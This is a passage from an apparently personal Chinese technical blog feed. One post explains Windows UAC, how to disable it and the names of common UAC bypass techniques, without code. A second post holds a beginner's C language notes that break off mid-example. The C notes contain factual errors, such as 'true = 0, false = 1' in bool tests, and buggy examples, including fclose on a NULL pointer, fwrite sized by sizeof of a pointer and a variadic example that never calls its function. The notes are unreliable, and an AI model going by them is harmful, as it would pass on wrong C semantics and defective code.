        <content type="html"><![CDATA[<h1 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>用户帐户控制（User Account Control，简称UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>UAC是Windows的<strong>强制访问控制</strong>强制功能，有助于防止操作系统发生未经授权的操作或更改</p><p>它是通过管理同意提示实现的，只要用户启动的应用程序需要管理权限来执行其任务，就会显示该提示。</p><p>根据微软的说法，这个提示可以确保任何未知或恶意软件都无法自行安装或继承管理权限，除非事先获得批准或用户明确授权</p><p>提示的唯一目的是在启动的程序需要提升权限时<strong>提醒</strong>用户。然后由用户决定是否应接受该请求</p><p>具体可以参考这里：<a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works">https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works</a></p><p>简单来说</p><p>就是这个弹框</p><h2 id="需要授权的动作包括"><a href="#需要授权的动作包括" class="headerlink" title="需要授权的动作包括"></a>需要授权的动作包括</h2><pre class="line-numbers language-none"><code class="language-none">1.配置Windows Update2.增加或删除用户账户3.改变用户的账户类型4.改变UAC设置6.安装ActiveX6.安装或移除程序7.安装设备驱动程序8.设置家长控制9.将文件移动或复制到Program Files或Windows目录10.查看其他用户文件夹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="关闭UAC-不建议这样做"><a href="#关闭UAC-不建议这样做" class="headerlink" title="关闭UAC(不建议这样做)"></a>关闭UAC(不建议这样做)</h2><p>首先Win+R</p><p>弹出运行框</p><pre class="line-numbers language-none"><code class="language-none">gpedit.msc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110312134042.png" alt="image-20210811092932810"></p><p>计算机设置-&gt;Windows设置-&gt;安全设置</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110312134045.png" alt="image-20210811093021306"></p><p>本地策略-&gt;安全选项</p><p>找到这个</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110312134046.png" alt="image-20210811093538132"></p><p>Windows默认下是这个</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110312134047.png" alt="image-20210811093602858"></p><p>这里也是有UAC的等级</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110312134048.png" alt="image-20210811093801563"></p><pre class="line-numbers language-none"><code class="language-none">不提示直接提升:关闭UAC，需要权限时直接提升权限在安全桌面上提示凭据:需要权限时在安全桌面上输入管理员密码提升权限在安全桌面上同意提示:需要权限时在安全桌面上选择“允许”提升权限提示凭据:需要权限时在普通窗口中输入管理员密码提升权限同意提示:需要权限时在普通窗口中选择“允许”提升权限非Windows二进制文件的同意提示:(默认设置)当非 Microsoft 应用程序的某个操作需要提升权限时，选择"允许"提升权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="BypassUAC常见手法"><a href="#BypassUAC常见手法" class="headerlink" title="BypassUAC常见手法"></a>BypassUAC常见手法</h2><pre class="line-numbers language-none"><code class="language-none">1.白名单提权机制 - autoElevate2.DLL劫持3.Windows自身漏洞提权4.远程注入5.COM 接口技术<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> BypassUAC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BypassUAC学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C &amp; 汇编</title>
      <link href="/2021/10/28/c-hui-bian/"/>
      <url>/2021/10/28/c-hui-bian/</url>
      
        <content type="html"><![CDATA[<h2 id="c语言生成过程"><a href="#c语言生成过程" class="headerlink" title="c语言生成过程"></a>c语言生成过程</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148860.png" alt="image-20211008002803097"></p><h2 id="进制"><a href="#进制" class="headerlink" title="进制"></a>进制</h2><pre class="line-numbers language-none"><code class="language-none">2进制(BIN):0 1------------------------------------------进位--------------------108进制(OCT):0 1 2 3 4 5 6 7------------------------------进位--------------------1010进制(DEC):0 1 2 3 4 5 6 7 8 9-------------------------进位--------------------1016进制(HEX):0 1 2 3 4 5 6 7 8 9 A B C D E F-------------进位--------------------10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>使用程序员计算器 即可</p><h2 id="位"><a href="#位" class="headerlink" title="位"></a>位</h2><p>32位的操作系统:FFFFFFFF(8个F)</p><p>64位的操作系统:FFFFFFFFFFFFFFFF(16个F)</p><p>Vs Studio 2019</p><p>C++ Windows 项目 空项目即可</p><h2 id="静态编译"><a href="#静态编译" class="headerlink" title="静态编译"></a>静态编译</h2><p>项目属性中 修改为 静态编译</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148861.png" alt="image-20211004122242363"></p><p>调试：F9</p><h2 id="pdb"><a href="#pdb" class="headerlink" title="pdb"></a>pdb</h2><p>这个是符号文件</p><h2 id="include"><a href="#include" class="headerlink" title="include"></a>include</h2><pre class="line-numbers language-none"><code class="language-none">include的时候&lt;&gt; 系统库"" 本地库<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="入口点"><a href="#入口点" class="headerlink" title="入口点"></a>入口点</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148862.png" alt="image-20211004125509646"></p><p>可以自己设置入口点</p><p>但是 默认是main</p><h2 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h2><p>防止头文件的重复包含</p><pre class="line-numbers language-none"><code class="language-none">#pragma once<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="调试技巧"><a href="#调试技巧" class="headerlink" title="调试技巧"></a>调试技巧</h2><p>错误监视</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148863.png" alt="image-20211004130905317"></p><pre class="line-numbers language-none"><code class="language-none">F5   运行程序F9   下断点F10  单步步过F11  单步步入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>语法错误 和 语义错误</p><h2 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h2><pre class="line-numbers language-none"><code class="language-none">_cdeclpush 压栈压的是一个存储的地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="整数类型-基于MSVC"><a href="#整数类型-基于MSVC" class="headerlink" title="整数类型(基于MSVC)"></a>整数类型(基于MSVC)</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148864.png" alt="image-20211004161729235"></p><p>最高位-&gt;符号位：0正数，1负数</p><p>无符号：用<code>unsigned</code>前缀</p><h2 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h2><pre class="line-numbers language-none"><code class="language-none">%d 格式化十进制数%o 格式化八进制数%x 格式化小写十六进制数%X 格式化大写十六进制数还有加上#:可以把前缀也打印出来%c char类型%f  float类型%Lf double类型<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="各进制声明"><a href="#各进制声明" class="headerlink" title="各进制声明"></a>各进制声明</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148865.png" alt="image-20211004162509153"></p><pre class="line-numbers language-none"><code class="language-none">注1.前缀2.八进制 不能出现8之后的数字,二进制只能有0,1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148866.png" alt="image-20211004163500194"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148867.png" alt="image-20211004163550881"></p><h2 id="浮点类型"><a href="#浮点类型" class="headerlink" title="浮点类型"></a>浮点类型</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148868.png" alt="image-20211004163616322"></p><p>浮点数：是一个不精确存储</p><h2 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a>布尔类型</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148869.png" alt="image-20211004163636049"></p><p>需要在加一个头文件</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdbool.h&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148870.png" alt="image-20211004164340297"></p><p>计算一个数组的长度</p><pre class="line-numbers language-none"><code class="language-none">strlen:遇到\0就结束计算sizeof:返回数组占用的空间长度<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>数组长度：10</p><p>索引：0-9</p><h2 id="初始化数组赋值"><a href="#初始化数组赋值" class="headerlink" title="初始化数组赋值"></a>初始化数组赋值</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148871.png" alt="image-20211004183603890"></p><p>它是按索引来的 0 - 9</p><p>所以它是给第六个元素赋值为：10</p><h2 id="数组越界"><a href="#数组越界" class="headerlink" title="数组越界"></a>数组越界</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148872.png" alt="image-20211004183942291"></p><h2 id="define-和-const"><a href="#define-和-const" class="headerlink" title="define 和 const"></a>define 和 const</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148873.png" alt="image-20211004164652671"></p><p><code>#denfine</code> 用来定义一个通用的 常量</p><p>使用宏,宏是属于预处理器，在编译的时候直接就被替换了</p><pre class="line-numbers language-none"><code class="language-none">#denfine SIZE_MAX_RK "12345"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="取消宏-gt-undef"><a href="#取消宏-gt-undef" class="headerlink" title="取消宏->undef"></a>取消宏-&gt;undef</h2><pre class="line-numbers language-none"><code class="language-none">#undef SIZE_MAX_RK "12345"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="判断环境-gt-ifdef"><a href="#判断环境-gt-ifdef" class="headerlink" title="判断环境>ifdef"></a>判断环境&gt;ifdef</h2><p>都是属于预定义宏</p><pre class="line-numbers language-none"><code class="language-none">#ifdef DEBUG#endif // DEBUG<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="条件预处理"><a href="#条件预处理" class="headerlink" title="条件预处理"></a>条件预处理</h2><p>主要是使用了宏</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148874.png" alt="image-20211005221356604"></p><h2 id="printf-和scanf"><a href="#printf-和scanf" class="headerlink" title="printf()和scanf()"></a>printf()和scanf()</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148875.png" alt="image-20211004165141051"></p><h2 id="scanf-是不安全的"><a href="#scanf-是不安全的" class="headerlink" title="scanf()是不安全的"></a>scanf()是不安全的</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148876.png" alt="image-20211004170019101"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148877.png" alt="image-20211004165737707"></p><pre class="line-numbers language-none"><code class="language-none">_CRT_SECURE_NO_WARNINGS<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148878.png" alt="image-20211004165336965"></p><p>进行添加即可</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148879.png" alt="image-20211004165824518"></p><p>字符数组 本身就是一个地址</p><p>不需要 <code>&amp;</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148880.png" alt="image-20211004170147612"></p><h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148881.png" alt="image-20211004170205378"></p><p>++</p><pre class="line-numbers language-none"><code class="language-none">b = a++ 先取值后运算b = ++a 先运算后取值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>+=</p><pre class="line-numbers language-none"><code class="language-none">a += 2等价于a = a + 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="让运行的程序停下来-调试"><a href="#让运行的程序停下来-调试" class="headerlink" title="让运行的程序停下来(调试)"></a>让运行的程序停下来(调试)</h2><pre class="line-numbers language-none"><code class="language-none">1.getchar();2.添加头文件#include &lt;stdlib.h&gt;system("pause");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="逻辑与或非"><a href="#逻辑与或非" class="headerlink" title="逻辑与或非"></a>逻辑与或非</h2><pre class="line-numbers language-none"><code class="language-none">与:&amp;&amp; 或:|| 非:!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="选择结构"><a href="#选择结构" class="headerlink" title="选择结构"></a>选择结构</h2><pre class="line-numbers language-none"><code class="language-none">1.if else2.switch case没有出现的选择 用defaultbreak跳出循环<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="goto"><a href="#goto" class="headerlink" title="goto"></a>goto</h2><p>简单来讲 就是无条件跳转到标签处</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148882.png" alt="image-20211004180347741"></p><h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><pre class="line-numbers language-none"><code class="language-none">1.while2.do while它会先执行一次3.for4.goto:(假循环)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>函数的<strong>定义</strong>要写在<strong>调用</strong>之前,不然会报错</p><p>或者写函数的声明,这个 可以放到头文件(<code>.h</code>)中</p><h2 id="形参和实参"><a href="#形参和实参" class="headerlink" title="形参和实参"></a>形参和实参</h2><p>简单理解一下</p><pre class="line-numbers language-none"><code class="language-none">1.实参给形参赋值2.函数内部调用形参<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>简单来讲 就是自己调用自己</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148883.png" alt="image-20211004182653688"></p><p>注：栈是有限的</p><h2 id="局部变量和全局变量"><a href="#局部变量和全局变量" class="headerlink" title="局部变量和全局变量"></a>局部变量和全局变量</h2><p>局部变量是在函数中 生命周期 不超过作用域</p><p>全局变量是在整个程序中，一般是写在头文件(.h中)</p><h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h2><pre class="line-numbers language-none"><code class="language-none">32位的程序-地址最大32位64位的程序-地址最大64位进程--4GB空间虚拟内存 2G用户空间 2G内核空间*:取出地址上的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>数组和变量是不同的</p><pre class="line-numbers language-none"><code class="language-none">数组指向名就可以变量需要&amp;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148884.png" alt="image-20211005084012426"></p><p>针对数组<br>指针+1 = 指针 + sizeof(int) = 下一个地址</p><p>一个例子</p><pre class="line-numbers language-none"><code class="language-none">int nRet = 0;addx(1, 2, &amp;nRet)void addx(int a, int b, int *c){*c = a + b;//改变了里面 所以外面也改变了}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="指针-amp-一维数组"><a href="#指针-amp-一维数组" class="headerlink" title="指针 &amp; 一维数组"></a>指针 &amp; 一维数组</h2><h3 id="第一种："><a href="#第一种：" class="headerlink" title="第一种："></a>第一种：</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148885.png" alt="image-20211005084603317"></p><h3 id="第二种："><a href="#第二种：" class="headerlink" title="第二种："></a>第二种：</h3><p>地址在++</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148886.png" alt="image-20211005084438560"></p><h2 id="指针注意点"><a href="#指针注意点" class="headerlink" title="指针注意点"></a>指针注意点</h2><p>指针默认是没用开辟空间的</p><p>直接给指针赋值 是<strong>不可以</strong>的</p><h2 id="指针-amp-二维数组"><a href="#指针-amp-二维数组" class="headerlink" title="指针 &amp; 二维数组"></a>指针 &amp; 二维数组</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148887.png" alt="image-20211005085617261"></p><pre class="line-numbers language-none"><code class="language-none">printg("%d", *p[2]);打印出来的是:7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>**p</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148888.png" alt="image-20211005085837681"></p><h2 id="多维数组打印输出"><a href="#多维数组打印输出" class="headerlink" title="多维数组打印输出"></a>多维数组打印输出</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148889.png" alt="image-20211005090207238"></p><h2 id="数组的变量保护"><a href="#数组的变量保护" class="headerlink" title="数组的变量保护"></a>数组的变量保护</h2><p>同样是使用const</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148890.png" alt="image-20211005090331724"></p><h2 id="变参函数"><a href="#变参函数" class="headerlink" title="变参函数"></a>变参函数</h2><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdarg.h&gt;//需要包含一个头文件int printStr(int a, ...){int nTemp = 0;va_list v1;             //它是一个参数列表va_start(v1, a);        //使用va_start宏进行初始化for(int i = 0;i &lt; a; i++ ){nTemp += va_arg(v1, int);}va_end(v1);             //使用va_end进行变量清理return nTemp;}int main(){int a = (2, 10, 20);printf("%d\n", a);system("pause");return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148891.png" alt="image-20211005091748250"></p><h2 id="定义字符串的三种方式"><a href="#定义字符串的三种方式" class="headerlink" title="定义字符串的三种方式"></a>定义字符串的三种方式</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148892.png" alt="image-20211005092451443"></p><h2 id="fgets-amp-puts"><a href="#fgets-amp-puts" class="headerlink" title="fgets &amp; puts"></a>fgets &amp; puts</h2><p>一组新的输入输出</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;//需要包含一个头文件int main(){char str[100] = { 0 };fgets(str, 100, stdin);//要定义缓冲区的长度,stdin接收输入puts(str);//puts自带换行}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148893.png" alt="image-20211005093437528"></p><h2 id="字符串处理"><a href="#字符串处理" class="headerlink" title="字符串处理"></a>字符串处理</h2><h3 id="字符串拼接-gt-strcat"><a href="#字符串拼接-gt-strcat" class="headerlink" title="字符串拼接->strcat"></a>字符串拼接-&gt;strcat</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;//需要包含一个头文件int main(){char strA[] = "aaa";char strB[100] = { 0 };strcat(strB, strA);printf("%s\n", strB);//aaastrcat(strB, strA);printf("%s", strB);//aaaaaa}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148894.png" alt="image-20211005094025397"></p><h3 id="字符串比较-gt-strcmp"><a href="#字符串比较-gt-strcmp" class="headerlink" title="字符串比较->strcmp"></a>字符串比较-&gt;strcmp</h3><p>注：</p><pre class="line-numbers language-none"><code class="language-none">strcmp返回的结果:0-&gt;字符串相同非0-&gt;字符串不同<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后 还有一点</p><pre class="line-numbers language-none"><code class="language-none">bool判断true = 0false = 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;//需要包含一个头文件int main(){char strA[] = "aaa";char strB[100] = { 0 };char strC[] = { 'a', 'a', 'a','\0' };int flag = strcmp(strA, strC);printf("%d\n", flag);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148895.png" alt="image-20211005094552084"></p><h3 id="字符串拷贝-gt-strncpy-strcpy"><a href="#字符串拷贝-gt-strncpy-strcpy" class="headerlink" title="字符串拷贝->strncpy/strcpy"></a>字符串拷贝-&gt;strncpy/strcpy</h3><pre class="line-numbers language-none"><code class="language-none">strncpy是一个安全函数因为它多了一个参数,填拷贝的个数strncpy(strB[], strC[], 5);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148896.png" alt="image-20211005095420041"></p><h2 id="字符串格式化-gt-sprintf"><a href="#字符串格式化-gt-sprintf" class="headerlink" title="字符串格式化->sprintf"></a>字符串格式化-&gt;sprintf</h2><p>简单来说 就是拼接输出</p><pre class="line-numbers language-none"><code class="language-none">sprintf(strB, "%s%d%hd", strA, a, b);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148897.png" alt="image-20211005095713986"></p><h2 id="寄存器-gt-register"><a href="#寄存器-gt-register" class="headerlink" title="寄存器->register"></a>寄存器-&gt;register</h2><pre class="line-numbers language-none"><code class="language-none">register //申请使用寄存器<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="自动类型-gt-auto"><a href="#自动类型-gt-auto" class="headerlink" title="自动类型->auto"></a>自动类型-&gt;auto</h2><p>尽量不要去用</p><pre class="line-numbers language-none"><code class="language-none">auto str = "aaa";auto Num = 10;printf("%s\n%d", str, Num);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148898.png" alt="image-20211005100328658"></p><h2 id="申请内存-amp-释放内存"><a href="#申请内存-amp-释放内存" class="headerlink" title="申请内存 &amp; 释放内存"></a>申请内存 &amp; 释放内存</h2><pre class="line-numbers language-none"><code class="language-none">申请内存C语言:malloc freeC++:new delete<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;//需要包含一个头文件int main(){char * p = (char *)malloc(50 * sizeof(char));//申请内存scanf("%s", p);printf("%s", p);free(p);                                    //释放内存system("pause");}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148899.png" alt="image-20211005101329154"></p><h2 id="刷内存"><a href="#刷内存" class="headerlink" title="刷内存"></a>刷内存</h2><pre class="line-numbers language-none"><code class="language-none">meset(p, 0, 50 * sizeof(char));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148900.png" alt="image-20211005101513826"></p><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;//需要包含一个头文件#include "源.h"char *MyFile(char *FilePath){FILE *pFile = 0;//定义一个文件指针//r w a 读 写 追加//rb wb ab b是以二进制的形式pFile = fopen(FilePath, "rb");if (pFile == NULL) //判断文件打开是否成功{printf("file open failed");system("pause");fclose(pFile);exit(0);}fseek(pFile, 0, SEEK_END);          //把指针移动到文件末尾int readFileSize = ftell(pFile);    //获取文件指针的位置,就是文件的大小rewind(pFile);                     //文件指针复位char *readFileBuffer = (char *)malloc((readFileSize + 1) *sizeof(char)); //申请内存, 本质是缓冲区if (readFileBuffer == NULL){printf("malloc memory failed");system("pause");fclose(pFile);exit(0);}memset(readFileBuffer, 0, (readFileSize + 1) *sizeof(char));            //缓冲区置空(0是偏移值)int readRet = 0;readRet = fread(readFileBuffer, 1, readFileSize, pFile);                           //读取进来(缓冲区, 1字节, 缓冲区大小, 文件指针)if (readRet != readFileSize)        //判断我们读取到内存 和 原先文件本身内存的大小{printf("read file failed");system("pause");fclose(pFile);exit(0);}fclose(pFile); //关闭文件指针return readFileBuffer; //缓冲区返回}int main(){char *p = MyFile("D:\\555.txt");system("pause");return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h2><pre class="line-numbers language-none"><code class="language-none">int MyWriteFile(char* FilePath, char* Str){FILE *pFile;                            //定义文件指针pFile = fopen(FilePath, "wb");          //打开文件if (pFile == NULL)                      //判断文件打开是否成功{printf("file open failed");system("pause");fclose(pFile);exit(0);}int ret = fwrite(Str, (sizeof(Str) + 1), 1, pFile); //写入文件fclose(pFile);return ret;}int main(){MyWriteFile("D:\\555.txt", "123456");system("pause");return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="结构体-gt-struct"><a href="#结构体-gt-struct" class="headerlink" title="结构体->struct"></a>结构体-&gt;struct</h2><p>头文件中写入</p><pre class="line-numbers language-none"><code class="language-none">struct Player{char PlayerName[20];int PlayerHP;};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="结构体读取"><a href="#结构体读取" class="headerlink" title="结构体读取"></a>结构体读取</h2><p>定义一个指针</p><pre class="line-numbers language-none"><code class="language-none">struct Player *p = MyFile("D:\\555.txt");<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="结构体写入"><a href="#结构体写入" class="headerlink" title="结构体写入"></a>结构体写入</h2><pre class="line-numbers language-none"><code class="language-none">定义结构体名struct Player aaa;函数中改一下fwriteint ret = fwrite(&amp;aaa, (sizeof(struct Player)), 1, pFile); //写入文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="结构体-分段写入"><a href="#结构体-分段写入" class="headerlink" title="结构体-分段写入"></a>结构体-分段写入</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148901.png" alt="image-20211005192501680"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148902.png" alt="image-20211005193747591"></p><h2 id="枚举-gt-enum"><a href="#枚举-gt-enum" class="headerlink" title="枚举->enum"></a>枚举-&gt;enum</h2><p>头文件中写入</p><pre class="line-numbers language-none"><code class="language-none">enum abc{low,medium,high};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="起别名-gt-typedef"><a href="#起别名-gt-typedef" class="headerlink" title="起别名->typedef"></a>起别名-&gt;typedef</h2><p>头文件中写入</p><pre class="line-numbers language-none"><code class="language-none">typedef char name;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="函数指针-重点"><a href="#函数指针-重点" class="headerlink" title="函数指针(重点)"></a>函数指针(重点)</h2><p>函数指针,函数名变成了类型</p><pre class="line-numbers language-none"><code class="language-none">int add(int a, int b){return a + b;} typedef int (*Myadd)(int a, int b) //函数指针,函数名变成了类型int main(){Myadd m = add;int c = 